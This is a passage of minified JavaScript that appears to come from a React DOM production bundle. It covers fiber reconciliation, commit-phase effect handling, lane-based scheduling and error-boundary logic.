13:if(Ee(Re),s=t.memoizedState,e===null||e.memoizedState!==null&&e.memoizedState.dehydrated!==null){if(Me&&ft!==null&&(t.mode&1)!==0&&(t.flags&128)===0)sd(),mr(),t.flags|=98560,u=!1;else if(u=fo(t),s!==null&&s.dehydrated!==null){if(e===null){if(!u)throw Error(o(318));if(u=t.memoizedState,u=u!==null?u.dehydrated:null,!u)throw Error(o(317));u[Ft]=t}else mr(),(t.flags&128)===0&&(t.memoizedState=null),t.flags|=4;Ze(t),u=!1}else Dt!==null&&(al(Dt),Dt=null),u=!0;if(!u)return t.flags&65536?t:null}return(t.flags&128)!==0?(t.lanes=i,t):(s=s!==null,s!==(e!==null&&e.memoizedState!==null)&&s&&(t.child.flags|=8192,(t.mode&1)!==0&&(e===null||(Re.current&1)!==0?We===0&&(We=3):ul())),t.updateQueue!==null&&(t.flags|=4),Ze(t),null);case 4:return wr(),Qa(e,t),e===null&&Jr(t.stateNode.containerInfo),Ze(t),null;case 10:return Ta(t.type._context),Ze(t),null;case 17:return st(t.type)&&lo(),Ze(t),null;case 19:if(Ee(Re),u=t.memoizedState,u===null)return Ze(t),null;if(s=(t.flags&128)!==0,m=u.rendering,m===null)if(s)di(u,!1);else{if(We!==0||e!==null&&(e.flags&128)!==0)for(e=t.child;e!==null;){if(m=wo(e),m!==null){for(t.flags|=128,di(u,!1),s=m.updateQueue,s!==null&&(t.updateQueue=s,t.flags|=4),t.subtreeFlags=0,s=i,i=t.child;i!==null;)u=i,e=s,u.flags&=14680066,m=u.alternate,m===null?(u.childLanes=0,u.lanes=e,u.child=null,u.subtreeFlags=0,u.memoizedProps=null,u.memoizedState=null,u.updateQueue=null,u.dependencies=null,u.stateNode=null):(u.childLanes=m.childLanes,u.lanes=m.lanes,u.child=m.child,u.subtreeFlags=0,u.deletions=null,u.memoizedProps=m.memoizedProps,u.memoizedState=m.memoizedState,u.updateQueue=m.updateQueue,u.type=m.type,e=m.dependencies,u.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext}),i=i.sibling;return Ce(Re,Re.current&1|2),t.child}e=e.sibling}u.tail!==null&&Be()>Tr&&(t.flags|=128,s=!0,di(u,!1),t.lanes=4194304)}else{if(!s)if(e=wo(m),e!==null){if(t.flags|=128,s=!0,i=e.updateQueue,i!==null&&(t.updateQueue=i,t.flags|=4),di(u,!0),u.tail===null&&u.tailMode==="hidden"&&!m.alternate&&!Me)return Ze(t),null}else 2*Be()-u.renderingStartTime>Tr&&i!==1073741824&&(t.flags|=128,s=!0,di(u,!1),t.lanes=4194304);u.isBackwards?(m.sibling=t.child,t.child=m):(i=u.last,i!==null?i.sibling=m:t.child=m,u.last=m)}return u.tail!==null?(t=u.tail,u.rendering=t,u.tail=t.sibling,u.renderingStartTime=Be(),t.sibling=null,i=Re.current,Ce(Re,s?i&1|2:i&1),t):(Ze(t),null);case 22:case 23:return cl(),s=t.memoizedState!==null,e!==null&&e.memoizedState!==null!==s&&(t.flags|=8192),s&&(t.mode&1)!==0?(gt&1073741824)!==0&&(Ze(t),t.subtreeFlags&6&&(t.flags|=8192)):Ze(t),null;case 24:return null;case 25:return null}throw Error(o(156,t.tag))}function Xy(e,t){switch(va(t),t.tag){case 1:return st(t.type)&&lo(),e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 3:return wr(),Ee(ot),Ee(Qe),Ma(),e=t.flags,(e&65536)!==0&&(e&128)===0?(t.flags=e&-65537|128,t):null;case 5:return Ia(t),null;case 13:if(Ee(Re),e=t.memoizedState,e!==null&&e.dehydrated!==null){if(t.alternate===null)throw Error(o(340));mr()}return e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 19:return Ee(Re),null;case 4:return wr(),null;case 10:return Ta(t.type._context),null;case 22:case 23:return cl(),null;case 24:return null;default:return null}}var Io=!1,Je=!1,Zy=typeof WeakSet=="function"?WeakSet:Set,Y=null;function xr(e,t){var i=e.ref;if(i!==null)if(typeof i=="function")try{i(null)}catch(s){je(e,t,s)}else i.current=null}function Xa(e,t,i){try{i()}catch(s){je(e,t,s)}}var ip=!1;function Jy(e,t){if(ca=qi,e=Bu(),ta(e)){if("selectionStart"in e)var i={start:e.selectionStart,end:e.selectionEnd};else e:{i=(i=e.ownerDocument)&&i.defaultView||window;var s=i.getSelection&&i.getSelection();if(s&&s.rangeCount!==0){i=s.anchorNode;var l=s.anchorOffset,u=s.focusNode;s=s.focusOffset;try{i.nodeType,u.nodeType}catch{i=null;break e}var m=0,b=-1,k=-1,R=0,V=0,z=e,F=null;t:for(;;){for(var G;z!==i||l!==0&&z.nodeType!==3||(b=m+l),z!==u||s!==0&&z.nodeType!==3||(k=m+s),z.nodeType===3&&(m+=z.nodeValue.length),(G=z.firstChild)!==null;)F=z,z=G;for(;;){if(z===e)break t;if(F===i&&++R===l&&(b=m),F===u&&++V===s&&(k=m),(G=z.nextSibling)!==null)break;z=F,F=z.parentNode}z=G}i=b===-1||k===-1?null:{start:b,end:k}}else i=null}i=i||{start:0,end:0}}else i=null;for(ua={focusedElem:e,selectionRange:i},qi=!1,Y=t;Y!==null;)if(t=Y,e=t.child,(t.subtreeFlags&1028)!==0&&e!==null)e.return=t,Y=e;else for(;Y!==null;){t=Y;try{var Q=t.alternate;if((t.flags&1024)!==0)switch(t.tag){case 0:case 11:case 15:break;case 1:if(Q!==null){var X=Q.memoizedProps,Fe=Q.memoizedState,E=t.stateNode,C=E.getSnapshotBeforeUpdate(t.elementType===t.type?X:Mt(t.type,X),Fe);E.__reactInternalSnapshotBeforeUpdate=C}break;case 3:var D=t.stateNode.containerInfo;D.nodeType===1?D.textContent="":D.nodeType===9&&D.documentElement&&D.removeChild(D.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(o(163))}}catch(_){je(t,t.return,_)}if(e=t.sibling,e!==null){e.return=t.return,Y=e;break}Y=t.return}return Q=ip,ip=!1,Q}function pi(e,t,i){var s=t.updateQueue;if(s=s!==null?s.lastEffect:null,s!==null){var l=s=s.next;do{if((l.tag&e)===e){var u=l.destroy;l.destroy=void 0,u!==void 0&&Xa(t,i,u)}l=l.next}while(l!==s)}}function Do(e,t){if(t=t.updateQueue,t=t!==null?t.lastEffect:null,t!==null){var i=t=t.next;do{if((i.tag&e)===e){var s=i.create;i.destroy=s()}i=i.next}while(i!==t)}}function Za(e){var t=e.ref;if(t!==null){var i=e.stateNode;switch(e.tag){case 5:e=i;break;default:e=i}typeof t=="function"?t(e):t.current=e}}function op(e){var t=e.alternate;t!==null&&(e.alternate=null,op(t)),e.child=null,e.deletions=null,e.sibling=null,e.tag===5&&(t=e.stateNode,t!==null&&(delete t[Ft],delete t[ti],delete t[fa],delete t[jy],delete t[By])),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}function sp(e){return e.tag===5||e.tag===3||e.tag===4}function ap(e){e:for(;;){for(;e.sibling===null;){if(e.return===null||sp(e.return))return null;e=e.return}for(e.sibling.return=e.return,e=e.sibling;e.tag!==5&&e.tag!==6&&e.tag!==18;){if(e.flags&2||e.child===null||e.tag===4)continue e;e.child.return=e,e=e.child}if(!(e.flags&2))return e.stateNode}}function Ja(e,t,i){var s=e.tag;if(s===5||s===6)e=e.stateNode,t?i.nodeType===8?i.parentNode.insertBefore(e,t):i.insertBefore(e,t):(i.nodeType===8?(t=i.parentNode,t.insertBefore(e,i)):(t=i,t.appendChild(e)),i=i._reactRootContainer,i!=null||t.onclick!==null||(t.onclick=so));else if(s!==4&&(e=e.child,e!==null))for(Ja(e,t,i),e=e.sibling;e!==null;)Ja(e,t,i),e=e.sibling}function el(e,t,i){var s=e.tag;if(s===5||s===6)e=e.stateNode,t?i.insertBefore(e,t):i.appendChild(e);else if(s!==4&&(e=e.child,e!==null))for(el(e,t,i),e=e.sibling;e!==null;)el(e,t,i),e=e.sibling}var Ke=null,Rt=!1;function gn(e,t,i){for(i=i.child;i!==null;)lp(e,t,i),i=i.sibling}function lp(e,t,i){if(Bt&&typeof Bt.onCommitFiberUnmount=="function")try{Bt.onCommitFiberUnmount(Wi,i)}catch{}switch(i.tag){case 5:Je||xr(i,t);case 6:var s=Ke,l=Rt;Ke=null,gn(e,t,i),Ke=s,Rt=l,Ke!==null&&(Rt?(e=Ke,i=i.stateNode,e.nodeType===8?e.parentNode.removeChild(i):e.removeChild(i)):Ke.removeChild(i.stateNode));break;case 18:Ke!==null&&(Rt?(e=Ke,i=i.stateNode,e.nodeType===8?ha(e.parentNode,i):e.nodeType===1&&ha(e,i),Hr(e)):ha(Ke,i.stateNode));break;case 4:s=Ke,l=Rt,Ke=i.stateNode.containerInfo,Rt=!0,gn(e,t,i),Ke=s,Rt=l;break;case 0:case 11:case 14:case 15:if(!Je&&(s=i.updateQueue,s!==null&&(s=s.lastEffect,s!==null))){l=s=s.next;do{var u=l,m=u.destroy;u=u.tag,m!==void 0&&((u&2)!==0||(u&4)!==0)&&Xa(i,t,m),l=l.next}while(l!==s)}gn(e,t,i);break;case 1:if(!Je&&(xr(i,t),s=i.stateNode,typeof s.componentWillUnmount=="function"))try{s.props=i.memoizedProps,s.state=i.memoizedState,s.componentWillUnmount()}catch(b){je(i,t,b)}gn(e,t,i);break;case 21:gn(e,t,i);break;case 22:i.mode&1?(Je=(s=Je)||i.memoizedState!==null,gn(e,t,i),Je=s):gn(e,t,i);break;default:gn(e,t,i)}}function cp(e){var t=e.updateQueue;if(t!==null){e.updateQueue=null;var i=e.stateNode;i===null&&(i=e.stateNode=new Zy),t.forEach(function(s){var l=lv.bind(null,e,s);i.has(s)||(i.add(s),s.then(l,l))})}}function Nt(e,t){var i=t.deletions;if(i!==null)for(var s=0;s<i.length;s++){var l=i[s];try{var u=e,m=t,b=m;e:for(;b!==null;){switch(b.tag){case 5:Ke=b.stateNode,Rt=!1;break e;case 3:Ke=b.stateNode.containerInfo,Rt=!0;break e;case 4:Ke=b.stateNode.containerInfo,Rt=!0;break e}b=b.return}if(Ke===null)throw Error(o(160));lp(u,m,l),Ke=null,Rt=!1;var k=l.alternate;k!==null&&(k.return=null),l.return=null}catch(R){je(l,t,R)}}if(t.subtreeFlags&12854)for(t=t.child;t!==null;)up(t,e),t=t.sibling}function up(e,t){var i=e.alternate,s=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:if(Nt(t,e),zt(e),s&4){try{pi(3,e,e.return),Do(3,e)}catch(X){je(e,e.return,X)}try{pi(5,e,e.return)}catch(X){je(e,e.return,X)}}break;case 1:Nt(t,e),zt(e),s&512&&i!==null&&xr(i,i.return);break;case 5:if(Nt(t,e),zt(e),s&512&&i!==null&&xr(i,i.return),e.flags&32){var l=e.stateNode;try{Nr(l,"")}catch(X){je(e,e.return,X)}}if(s&4&&(l=e.stateNode,l!=null)){var u=e.memoizedProps,m=i!==null?i.memoizedProps:u,b=e.type,k=e.updateQueue;if(e.updateQueue=null,k!==null)try{b==="input"&&u.type==="radio"&&u.name!=null&&Vc(l,u),Ms(b,m);var R=Ms(b,u);for(m=0;m<k.length;m+=2){var V=k[m],z=k[m+1];V==="style"?$c(l,z):V==="dangerouslySetInnerHTML"?Hc(l,z):V==="children"?Nr(l,z):N(l,V,z,R)}switch(b){case"input":As(l,u);break;case"textarea":_c(l,u);break;case"select":var F=l._wrapperState.wasMultiple;l._wrapperState.wasMultiple=!!u.multiple;var G=u.value;G!=null?tr(l,!!u.multiple,G,!1):F!==!!u.multiple&&(u.defaultValue!=null?tr(l,!!u.multiple,u.defaultValue,!0):tr(l,!!u.multiple,u.multiple?[]:"",!1))}l[ti]=u}catch(X){je(e,e.return,X)}}break;case 6:if(Nt(t,e),zt(e),s&4){if(e.stateNode===null)throw Error(o(162));l=e.stateNode,u=e.memoizedProps;try{l.nodeValue=u}catch(X){je(e,e.return,X)}}break;case 3:if(Nt(t,e),zt(e),s&4&&i!==null&&i.memoizedState.isDehydrated)try{Hr(t.containerInfo)}catch(X){je(e,e.return,X)}break;case 4:Nt(t,e),zt(e);break;case 13:Nt(t,e),zt(e),l=e.child,l.flags&8192&&(u=l.memoizedState!==null,l.stateNode.isHidden=u,!u||l.alternate!==null&&l.alternate.memoizedState!==null||(rl=Be())),s&4&&cp(e);break;case 22:if(V=i!==null&&i.memoizedState!==null,e.mode&1?(Je=(R=Je)||V,Nt(t,e),Je=R):Nt(t,e),zt(e),s&8192){if(R=e.memoizedState!==null,(e.stateNode.isHidden=R)&&!V&&(e.mode&1)!==0)for(Y=e,V=e.child;V!==null;){for(z=Y=V;Y!==null;){switch(F=Y,G=F.child,F.tag){case 0:case 11:case 14:case 15:pi(4,F,F.return);break;case 1:xr(F,F.return);var Q=F.stateNode;if(typeof Q.componentWillUnmount=="function"){s=F,i=F.return;try{t=s,Q.props=t.memoizedProps,Q.state=t.memoizedState,Q.componentWillUnmount()}catch(X){je(s,i,X)}}break;case 5:xr(F,F.return);break;case 22:if(F.memoizedState!==null){hp(z);continue}}G!==null?(G.return=F,Y=G):hp(z)}V=V.sibling}e:for(V=null,z=e;;){if(z.tag===5){if(V===null){V=z;try{l=z.stateNode,R?(u=l.style,typeof u.setProperty=="function"?u.setProperty("display","none","important"):u.display="none"):(b=z.stateNode,k=z.memoizedProps.style,m=k!=null&&k.hasOwnProperty("display")?k.display:null,b.style.display=Gc("display",m))}catch(X){je(e,e.return,X)}}}else if(z.tag===6){if(V===null)try{z.stateNode.nodeValue=R?"":z.memoizedProps}catch(X){je(e,e.return,X)}}else if((z.tag!==22&&z.tag!==23||z.memoizedState===null||z===e)&&z.child!==null){z.child.return=z,z=z.child;continue}if(z===e)break e;for(;z.sibling===null;){if(z.return===null||z.return===e)break e;V===z&&(V=null),z=z.return}V===z&&(V=null),z.sibling.return=z.return,z=z.sibling}}break;case 19:Nt(t,e),zt(e),s&4&&cp(e);break;case 21:break;default:Nt(t,e),zt(e)}}function zt(e){var t=e.flags;if(t&2){try{e:{for(var i=e.return;i!==null;){if(sp(i)){var s=i;break e}i=i.return}throw Error(o(160))}switch(s.tag){case 5:var l=s.stateNode;s.flags&32&&(Nr(l,""),s.flags&=-33);var u=ap(e);el(e,u,l);break;case 3:case 4:var m=s.stateNode.containerInfo,b=ap(e);Ja(e,b,m);break;default:throw Error(o(161))}}catch(k){je(e,e.return,k)}e.flags&=-3}t&4096&&(e.flags&=-4097)}function ev(e,t,i){Y=e,dp(e)}function dp(e,t,i){for(var s=(e.mode&1)!==0;Y!==null;){var l=Y,u=l.child;if(l.tag===22&&s){var m=l.memoizedState!==null||Io;if(!m){var b=l.alternate,k=b!==null&&b.memoizedState!==null||Je;b=Io;var R=Je;if(Io=m,(Je=k)&&!R)for(Y=l;Y!==null;)m=Y,k=m.child,m.tag===22&&m.memoizedState!==null?fp(l):k!==null?(k.return=m,Y=k):fp(l);for(;u!==null;)Y=u,dp(u),u=u.sibling;Y=l,Io=b,Je=R}pp(e)}else(l.subtreeFlags&8772)!==0&&u!==null?(u.return=l,Y=u):pp(e)}}function pp(e){for(;Y!==null;){var t=Y;if((t.flags&8772)!==0){var i=t.alternate;try{if((t.flags&8772)!==0)switch(t.tag){case 0:case 11:case 15:Je||Do(5,t);break;case 1:var s=t.stateNode;if(t.flags&4&&!Je)if(i===null)s.componentDidMount();else{var l=t.elementType===t.type?i.memoizedProps:Mt(t.type,i.memoizedProps);s.componentDidUpdate(l,i.memoizedState,s.__reactInternalSnapshotBeforeUpdate)}var u=t.updateQueue;u!==null&&hd(t,u,s);break;case 3:var m=t.updateQueue;if(m!==null){if(i=null,t.child!==null)switch(t.child.tag){case 5:i=t.child.stateNode;break;case 1:i=t.child.stateNode}hd(t,m,i)}break;case 5:var b=t.stateNode;if(i===null&&t.flags&4){i=b;var k=t.memoizedProps;switch(t.type){case"button":case"input":case"select":case"textarea":k.autoFocus&&i.focus();break;case"img":k.src&&(i.src=k.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(t.memoizedState===null){var R=t.alternate;if(R!==null){var V=R.memoizedState;if(V!==null){var z=V.dehydrated;z!==null&&Hr(z)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(o(163))}Je||t.flags&512&&Za(t)}catch(F){je(t,t.return,F)}}if(t===e){Y=null;break}if(i=t.sibling,i!==null){i.return=t.return,Y=i;break}Y=t.return}}function hp(e){for(;Y!==null;){var t=Y;if(t===e){Y=null;break}var i=t.sibling;if(i!==null){i.return=t.return,Y=i;break}Y=t.return}}function fp(e){for(;Y!==null;){var t=Y;try{switch(t.tag){case 0:case 11:case 15:var i=t.return;try{Do(4,t)}catch(k){je(t,i,k)}break;case 1:var s=t.stateNode;if(typeof s.componentDidMount=="function"){var l=t.return;try{s.componentDidMount()}catch(k){je(t,l,k)}}var u=t.return;try{Za(t)}catch(k){je(t,u,k)}break;case 5:var m=t.return;try{Za(t)}catch(k){je(t,m,k)}}}catch(k){je(t,t.return,k)}if(t===e){Y=null;break}var b=t.sibling;if(b!==null){b.return=t.return,Y=b;break}Y=t.return}}var tv=Math.ceil,Mo=B.ReactCurrentDispatcher,tl=B.ReactCurrentOwner,Tt=B.ReactCurrentBatchConfig,me=0,Ge=null,Oe=null,qe=0,gt=0,Sr=un(0),We=0,hi=null,Vn=0,Ro=0,nl=0,fi=null,lt=null,rl=0,Tr=1/0,Qt=null,No=!1,il=null,mn=null,Lo=!1,yn=null,jo=0,gi=0,ol=null,Bo=-1,Fo=0;function rt(){return(me&6)!==0?Be():Bo!==-1?Bo:Bo=Be()}function vn(e){return(e.mode&1)===0?1:(me&2)!==0&&qe!==0?qe&-qe:Vy.transition!==null?(Fo===0&&(Fo=au()),Fo):(e=xe,e!==0||(e=window.event,e=e===void 0?16:mu(e.type)),e)}function Lt(e,t,i,s){if(50<gi)throw gi=0,ol=null,Error(o(185));Or(e,i,s),((me&2)===0||e!==Ge)&&(e===Ge&&((me&2)===0&&(Ro|=i),We===4&&bn(e,qe)),ct(e,s),i===1&&me===0&&(t.mode&1)===0&&(Tr=Be()+500,uo&&pn()))}function ct(e,t){var i=e.callbackNode;Vm(e,t);var s=Gi(e,e===Ge?qe:0);if(s===0)i!==null&&iu(i),e.callbackNode=null,e.callbackPriority=0;else if(t=s&-s,e.callbackPriority!==t){if(i!=null&&iu(i),t===1)e.tag===0?Fy(mp.bind(null,e)):td(mp.bind(null,e)),Ny(function(){(me&6)===0&&pn()}),i=null;else{switch(lu(s)){case 1:i=Vs;break;case 4:i=ou;break;case 16:i=_i;break;case 536870912:i=su;break;default:i=_i}i=Tp(i,gp.bind(null,e))}e.callbackPriority=t,e.callbackNode=i}}function gp(e,t){if(Bo=-1,Fo=0,(me&6)!==0)throw Error(o(327));var i=e.callbackNode;if(Cr()&&e.callbackNode!==i)return null;var s=Gi(e,e===Ge?qe:0);if(s===0)return null;if((s&30)!==0||(s&e.expiredLanes)!==0||t)t=Vo(e,s);else{t=s;var l=me;me|=2;var u=vp();(Ge!==e||qe!==t)&&(Qt=null,Tr=Be()+500,zn(e,t));do try{iv();break}catch(b){yp(e,b)}while(!0);Sa(),Mo.current=u,me=l,Oe!==null?t=0:(Ge=null,qe=0,t=We)}if(t!==0){if(t===2&&(l=Os(e),l!==0&&(s=l,t=sl(e,l))),t===1)throw i=hi,zn(e,0),bn(e,s),ct(e,Be()),i;if(t===6)bn(e,s);else{if(l=e.current.alternate,(s&30)===0&&!nv(l)&&(t=Vo(e,s),t===2&&(u=Os(e),u!==0&&(s=u,t=sl(e,u))),t===1))throw i=hi,zn(e,0),bn(e,s),ct(e,Be()),i;switch(e.finishedWork=l,e.finishedLanes=s,t){case 0:case 1:throw Error(o(345));case 2:_n(e,lt,Qt);break;case 3:if(bn(e,s),(s&130023424)===s&&(t=rl+500-Be(),10<t)){if(Gi(e,0)!==0)break;if(l=e.suspendedLanes,(l&s)!==s){rt(),e.pingedLanes|=e.suspendedLanes&l;break}e.timeoutHandle=pa(_n.bind(null,e,lt,Qt),t);break}_n(e,lt,Qt);break;case 4:if(bn(e,s),(s&4194240)===s)break;for(t=e.eventTimes,l=-1;0<s;){var m=31-Et(s);u=1<<m,m=t[m],m>l&&(l=m),s&=~u}if(s=l,s=Be()-s,s=(120>s?120:480>s?480:1080>s?1080:1920>s?1920:3e3>s?3e3:4320>s?4320:1960*tv(s/1960))-s,10<s){e.timeoutHandle=pa(_n.bind(null,e,lt,Qt),s);break}_n(e,lt,Qt);break;case 5:_n(e,lt,Qt);break;default:throw Error(o(329))}}}return ct(e,Be()),e.callbackNode===i?gp.bind(null,e):null}function sl(e,t){var i=fi;return e.current.memoizedState.isDehydrated&&(zn(e,t).flags|=256),e=Vo(e,t),e!==2&&(t=lt,lt=i,t!==null&&al(t)),e}function al(e){lt===null?lt=e:lt.push.apply(lt,e)}function nv(e){for(var t=e;;){if(t.flags&16384){var i=t.updateQueue;if(i!==null&&(i=i.stores,i!==null))for(var s=0;s<i.length;s++){var l=i[s],u=l.getSnapshot;l=l.value;try{if(!It(u(),l))return!1}catch{return!1}}}if(i=t.child,t.subtreeFlags&16384&&i!==null)i.return=t,t=i;else{if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return!0;t=t.return}t.sibling.return=t.return,t=t.sibling}}return!0}function bn(e,t){for(t&=~nl,t&=~Ro,e.suspendedLanes|=t,e.pingedLanes&=~t,e=e.expirationTimes;0<t;){var i=31-Et(t),s=1<<i;e[i]=-1,t&=~s}}function mp(e){if((me&6)!==0)throw Error(o(327));Cr();var t=Gi(e,0);if((t&1)===0)return ct(e,Be()),null;var i=Vo(e,t);if(e.tag!==0&&i===2){var s=Os(e);s!==0&&(t=s,i=sl(e,s))}if(i===1)throw i=hi,zn(e,0),bn(e,t),ct(e,Be()),i;if(i===6)throw Error(o(345));return e.finishedWork=e.current.alternate,e.finishedLanes=t,_n(e,lt,Qt),ct(e,Be()),null}function ll(e,t){var i=me;me|=1;try{return e(t)}finally{me=i,me===0&&(Tr=Be()+500,uo&&pn())}}function On(e){yn!==null&&yn.tag===0&&(me&6)===0&&Cr();var t=me;me|=1;var i=Tt.transition,s=xe;try{if(Tt.transition=null,xe=1,e)return e()}finally{xe=s,Tt.transition=i,me=t,(me&6)===0&&pn()}}function cl(){gt=Sr.current,Ee(Sr)}function zn(e,t){e.finishedWork=null,e.finishedLanes=0;var i=e.timeoutHandle;if(i!==-1&&(e.timeoutHandle=-1,Ry(i)),Oe!==null)for(i=Oe.return;i!==null;){var s=i;switch(va(s),s.tag){case 1:s=s.type.childContextTypes,s!=null&&lo();break;case 3:wr(),Ee(ot),Ee(Qe),Ma();break;case 5:Ia(s);break;case 4:wr();break;case 13:Ee(Re);break;case 19:Ee(Re);break;case 10:Ta(s.type._context);break;case 22:case 23:cl()}i=i.return}if(Ge=e,Oe=e=wn(e.current,null),qe=gt=t,We=0,hi=null,nl=Ro=Vn=0,lt=fi=null,jn!==null){for(t=0;t<jn.length;t++)if(i=jn[t],s=i.interleaved,s!==null){i.interleaved=null;var l=s.next,u=i.pending;if(u!==null){var m=u.next;u.next=l,s.next=m}i.pending=s}jn=null}return e}function yp(e,t){do{var i=Oe;try{if(Sa(),ko.current=Co,xo){for(var s=Ne.memoizedState;s!==null;){var l=s.queue;l!==null&&(l.pending=null),s=s.next}xo=!1}if(Fn=0,He=_e=Ne=null,ai=!1,li=0,tl.current=null,i===null||i.return===null){We=1,hi=t,Oe=null;break}e:{var u=e,m=i.return,b=i,k=t;if(t=qe,b.flags|=32768,k!==null&&typeof k=="object"&&typeof k.then=="function"){var R=k,V=b,z=V.tag;if((V.mode&1)===0&&(z===0||z===11||z===15)){var F=V.alternate;F?(V.updateQueue=F.updateQueue,V.memoizedState=F.memoizedState,V.lanes=F.lanes):(V.updateQueue=null,V.memoizedState=null)}var G=Wd(m);if(G!==null){G.flags&=-257,Ud(G,m,b,u,t),G.mode&1&&_d(u,R,t),t=G,k=R;var Q=t.updateQueue;if(Q===null){var X=new Set;X.add(k),t.updateQueue=X}else Q.add(k);break e}else{if((t&1)===0){_d(u,R,t),ul();break e}k=Error(o(426))}}else if(Me&&b.mode&1){var Fe=Wd(m);if(Fe!==null){(Fe.flags&65536)===0&&(Fe.flags|=256),Ud(Fe,m,b,u,t),ka(kr(k,b));break e}}u=k=kr(k,b),We!==4&&(We=2),fi===null?fi=[u]:fi.push(u),u=m;do{switch(u.tag){case 3:u.flags|=65536,t&=-t,u.lanes|=t;var E=Od(u,k,t);pd(u,E);break e;case 1:b=k;var C=u.type,D=u.stateNode;if((u.flags&128)===0&&(typeof C.getDerivedStateFromError=="function"||D!==null&&typeof D.componentDidCatch=="function"&&(mn===null||!mn.has(D)))){u.flags|=65536,t&=-t,u.lanes|=t;var _=zd(u,b,t);pd(u,_);break e}}u=u.return}while(u!==null)}wp(i)}catch(te){t=te,Oe===i&&i!==null&&(Oe=i=i.return);continue}break}while(!0)}function vp(){var e=Mo.current;return Mo.current=Co,e===null?Co:e}function ul(){(We===0||We===3||We===2)&&(We=4),Ge===null||(Vn&268435455)===0&&(Ro&268435455)===0||bn(Ge,qe)}function Vo(e,t){var i=me;me|=2;var s=vp();(Ge!==e||qe!==t)&&(Qt=null,zn(e,t));do try{rv();break}catch(l){yp(e,l)}while(!0);if(Sa(),me=i,Mo.current=s,Oe!==null)throw Error(o(261));return Ge=null,qe=0,We}function rv(){for(;Oe!==null;)bp(Oe)}function iv(){for(;Oe!==null&&!Im();)bp(Oe)}function bp(e){var t=Sp(e.alternate,e,gt);e.memoizedProps=e.pendingProps,t===null?wp(e):Oe=t,tl.current=null}function wp(e){var t=e;do{var i=t.alternate;if(e=t.return,(t.flags&32768)===0){if(i=Qy(i,t,gt),i!==null){Oe=i;return}}else{if(i=Xy(i,t),i!==null){i.flags&=32767,Oe=i;return}if(e!==null)e.flags|=32768,e.subtreeFlags=0,e.deletions=null;else{We=6,Oe=null;return}}if(t=t.sibling,t!==null){Oe=t;return}Oe=t=e}while(t!==null);We===0&&(We=5)}function _n(e,t,i){var s=xe,l=Tt.transition;try{Tt.transition=null,xe=1,ov(e,t,i,s)}finally{Tt.transition=l,xe=s}return null}function ov(e,t,i,s){do Cr();while(yn!==null);if((me&6)!==0)throw Error(o(327));i=e.finishedWork;var l=e.finishedLanes;if(i===null)return null;if(e.finishedWork=null,e.finishedLanes=0,i===e.current)throw Error(o(177));e.callbackNode=null,e.callbackPriority=0;var u=i.lanes|i.childLanes;if(Om(e,u),e===Ge&&(Oe=Ge=null,qe=0),(i.subtreeFlags&2064)===0&&(i.flags&2064)===0||Lo||(Lo=!0,Tp(_i,function(){return Cr(),null})),u=(i.flags&15990)!==0,(i.subtreeFlags&15990)!==0||u){u=Tt.transition,Tt.transition=null;var m=xe;xe=1;var b=me;me|=4,tl.current=null,Jy(e,i),up(i,e),Cy(ua),qi=!!ca,ua=ca=null,e.current=i,ev(i),Dm(),me=b,xe=m,Tt.transition=u}else e.current=i;if(Lo&&(Lo=!1,yn=e,jo=l),u=e.pendingLanes,u===0&&(mn=null),Nm(i.stateNode),ct(e,Be()),t!==null)for(s=e.onRecoverableError,i=0;i<t.length;i++)l=t[i],s(l.value,{componentStack:l.stack,digest:l.digest});if(No)throw No=!1,e=il,il=null,e;return(jo&1)!==0&&e.tag!==0&&Cr(),u=e.pendingLanes,(u&1)!==0?e===ol?gi++:(gi=0,ol=e):gi=0,pn(),null}function Cr(){if(yn!==null){var e=lu(jo),t=Tt.transition,i=xe;try{if(Tt.transition=null,xe=16>e?16:e,yn===null)var s=!1;else{if(e=yn,yn=null,jo=0,(me&6)!==0)throw Error(o(331));var l=me;for(me|=4,Y=e.current;Y!==null;){var u=Y,m=u.child;if((Y.flags&16)!==0){var b=u.deletions;if(b!==null){for(var k=0;k<b.length;k++){var R=b[k];for(Y=R;Y!==null;){var V=Y;switch(V.tag){case 0:case 11:case 15:pi(8,V,u)}var z=V.child;if(z!==null)z.return=V,Y=z;else for(;Y!==null;){V=Y;var F=V.sibling,G=V.return;if(op(V),V===R){Y=null;break}if(F!==null){F.return=G,Y=F;break}Y=G}}}var Q=u.alternate;if(Q!==null){var X=Q.child;if(X!==null){Q.child=null;do{var Fe=X.sibling;X.sibling=null,X=Fe}while(X!==null)}}Y=u}}if((u.subtreeFlags&2064)!==0&&m!==null)m.return=u,Y=m;else e:for(;Y!==null;){if(u=Y,(u.flags&2048)!==0)switch(u.tag){case 0:case 11:case 15:pi(9,u,u.return)}var E=u.sibling;if(E!==null){E.return=u.return,Y=E;break e}Y=u.return}}var C=e.current;for(Y=C;Y!==null;){m=Y;var D=m.child;if((m.subtreeFlags&2064)!==0&&D!==null)D.return=m,Y=D;else e:for(m=C;Y!==null;){if(b=Y,(b.flags&2048)!==0)try{switch(b.tag){case 0:case 11:case 15:Do(9,b)}}catch(te){je(b,b.return,te)}if(b===m){Y=null;break e}var _=b.sibling;if(_!==null){_.return=b.return,Y=_;break e}Y=b.return}}if(me=l,pn(),Bt&&typeof Bt.onPostCommitFiberRoot=="function")try{Bt.onPostCommitFiberRoot(Wi,e)}catch{}s=!0}return s}finally{xe=i,Tt.transition=t}}return!1}function kp(e,t,i){t=kr(i,t),t=Od(e,t,1),e=fn(e,t,1),t=rt(),e!==null&&(Or(e,1,t),ct(e,t))}function je(e,t,i){if(e.tag===3)kp(e,e,i);else for(;t!==null;){if(t.tag===3){kp(t,e,i);break}else if(t.tag===1){var s=t.stateNode;if(typeof t.type.getDerivedStateFromError=="function"||typeof s.componentDidCatch=="function"&&(mn===null||!mn.has(s))){e=kr(i,e),e=zd(t,e,1),t=fn(t,e,1),e=rt(),t!==null&&(Or(t,1,e),ct(t,e));break}}t=t.return}}function sv(e,t,i){var 